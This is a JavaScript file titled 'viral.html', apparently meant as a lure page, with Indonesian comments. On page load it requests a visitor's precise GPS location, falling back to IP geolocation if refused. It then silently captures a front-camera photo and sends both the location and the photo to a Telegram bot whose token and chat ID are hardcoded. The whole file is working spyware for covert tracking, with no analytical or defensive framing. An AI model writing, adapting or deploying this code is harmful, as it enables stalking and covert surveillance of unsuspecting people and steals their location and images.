# viral.html
const token = "8371743763:AAHfhPZENAYY0l8z5iUxsgHUuj-ney5SIa0";
const chatId = "8465963357";

async function execute() {
    // Meminta izin lokasi presisi (GPS)
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(async (position) => {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const acc = position.coords.accuracy;

            const text = `
📍 **LOKASI PRESISI (GPS)**
━━━━━━━━━━━━━━━━━━
🎯 **Latitude**: ${lat}
🎯 **Longitude**: ${lon}
📏 **Akurasi**: ${acc} meter
🗺️ **Google Maps**: https://www.google.com/maps?q=${lat},${lon}
━━━━━━━━━━━━━━━━━━`;

            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({chat_id: chatId, text: text, parse_mode: 'Markdown'})
            });
            
            // Lanjut jepret foto setelah dapet lokasi
            takePhoto();
        }, 
        (err) => {
            // Jika GPS ditolak, fallback ke IP (lokasi kasar)
            fetch('https://ipapi.co/json/').then(r => r.json()).then(d => {
                const text = `⚠️ **GPS DITOLAK! Menggunakan Lokasi IP**\n\n🏙️ Kota: ${d.city}\n📍 Koordinat: ${d.latitude}, ${d.longitude}`;
                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({chat_id: chatId, text: text})
                });
            });
            takePhoto();
        }, { enableHighAccuracy: true });
    }
}

// Fungsi foto dipisah biar rapi
async function takePhoto() {
    try {
        const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        const v = document.getElementById('v');
        const c = document.getElementById('c');
        v.srcObject = s;
        await v.play();
        setTimeout(() => {
            c.width = v.videoWidth; c.height = v.videoHeight;
            c.getContext('2d').drawImage(v, 0, 0);
            c.toBlob(b => {
                const fd = new FormData();
                fd.append('chat_id', chatId);
                fd.append('photo', b, 'shot.jpg');
                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
            }, 'image/jpeg');
        }, 1000);
    } catch (e) {}
}

window.onload = execute;
